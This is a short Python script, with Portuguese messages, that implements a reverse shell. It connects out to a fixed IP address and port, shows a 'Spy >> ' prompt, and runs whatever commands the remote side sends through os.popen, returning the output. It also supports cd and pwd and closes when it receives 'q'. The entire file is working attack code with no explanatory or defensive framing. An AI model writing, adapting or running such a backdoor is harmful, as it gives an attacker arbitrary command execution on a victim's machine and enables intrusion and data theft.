import socket, os

ip = "192.168.15.104"
port = 1230
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
init = "============= CONNECTED =============\n"
s.send(init.encode())

while True:
    s.send(b'Spy >> ')
    r = s.recv(1024)
    result = r.decode()
    result = result.replace('\n', '')

    if (result.startswith('cd')):
        os.chdir(result[3:])
        sent = "Diretório atual : " + str(os.getcwd()) + '\n'
        s.send(sent.encode())
    elif (result == 'pwd'):
        sent = "Diretório atual : "+ str(os.getcwd()) + '\n'
        s.send(sent.encode())
    elif (result == 'q'):
        sent = "Saindo...\n"
        s.send(sent.encode())
        s.close()
        break
    else:
        message = os.popen(result).read();
        s.send(message.encode())